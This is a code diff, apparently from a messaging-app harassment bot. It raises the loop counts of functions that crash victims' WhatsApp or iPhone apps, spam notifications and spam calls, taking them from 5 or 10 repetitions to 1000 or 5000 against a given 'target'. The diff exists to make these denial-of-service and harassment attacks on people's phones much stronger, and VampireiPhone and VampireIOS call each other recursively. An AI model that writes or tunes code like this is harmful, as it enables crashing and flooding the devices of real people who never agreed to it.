@@ -997,7 +997,7 @@ target,
 );
 }
 async function VampireIOS(target) {
-for (let i = 0; i < 10; i++) {
+for (let i = 0; i < 1000; i++) {
 await VampireCrashiPhone(target);
 await VampireiPhone(target);
 await VampireInvisIphone(target);
@@ -1005,7 +1005,7 @@ await VampireBlankIphone(target);
 }
 };
 async function VampireStuckLogo(target) {
-    for (let i = 0; i <= 10; i++) {
+    for (let i = 0; i <= 1000; i++) {
     await VampireBlank(target, Ptcp = true)
     await VampireSuperUi(target, Ptcp = true)
     await VampireSpamNotif(target, Ptcp = true)
@@ -1021,7 +1021,7 @@ async function VampireStuckLogo(target) {
 
 }
 async function VampireNewBug(target) {
-    for (let i = 0; i <= 5; i++) {
+    for (let i = 0; i <= 5000; i++) {
     await VampireSuperUi(target, Ptcp = true)
     await VampireCrashWa(target, Ptcp = true)
     await VampireCrashTotal(target)
@@ -1036,7 +1036,7 @@ async function VampireNewBug(target) {
 
 }
 async function VampireSpecial(target) {
-    for (let i = 0; i <= 5; i++) {
+    for (let i = 0; i <= 5000; i++) {
     await VampireCrashTotal(target)
     await VampireSuperUi(target, Ptcp = true)
     await VampireCrashWa(target, Ptcp = true)
@@ -1051,7 +1051,7 @@ async function VampireSpecial(target) {
 
 }
 async function VampCrashChat(target) {
-    for (let i = 0; i <= 5; i++) {
+    for (let i = 0; i <= 5000; i++) {
     await VampireSuperUi(target, Ptcp = true)
     await VampireCrashWa(target, Ptcp = true)
     await VampireCrashTotal(target)
@@ -1067,7 +1067,7 @@ async function VampCrashChat(target) {
 
 }
 async function VampCrashUi(target) {
-    for (let i = 0; i <= 5; i++) {
+    for (let i = 0; i <= 5000; i++) {
     await VampireSuperUi(target, Ptcp = true)
     await VampireCrashWa(target, Ptcp = true)
     await VampireCrashTotal(target)
@@ -1088,13 +1088,13 @@ async function VampCrashUi(target) {
 
 }
 async function VampireiPhone(target) {
-    for (let i = 0; i <= 5; i++) {
+    for (let i = 0; i <= 5000; i++) {
     await VampireIOS(target);
     }
 
 }
 async function callbug(target) {
-  for (let i = 0; i <= 5; i++) {
+  for (let i = 0; i <= 5000; i++) {
     await spamcall(target);
     await sleep(3000)
   }
